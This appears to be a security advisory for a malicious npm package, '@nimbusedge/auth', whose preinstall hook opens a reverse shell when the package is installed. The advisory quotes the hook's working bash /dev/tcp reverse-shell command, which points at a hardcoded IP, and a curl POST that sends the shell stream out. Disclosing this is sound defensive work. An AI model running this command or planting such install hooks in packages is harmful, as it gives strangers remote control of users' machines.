summary: preinstall hook opens reverse shell to hardcoded remote host on npm install
details: package.json declares a preinstall lifecycle script that runs `bash -i >& /dev/tcp/147.93.157.202/8080 0>&1` and pipes the resulting shell stream via `curl -X POST` to http://canarytokens.com/terms/[...]/contact.php. Running `npm install @nimbusedge/auth` automatically executes this hook, binding an interactive bash session on the installer's machine to TCP 147.93.157.202:8080 under the control of whoever operates that endpoint. The behavior fires unconditionally, uses a bare IP over cleartext, and gives the remote party arbitrary command execution on the installer's host at install time.

cwes.description: The product contains code that appears to be malicious in nature.
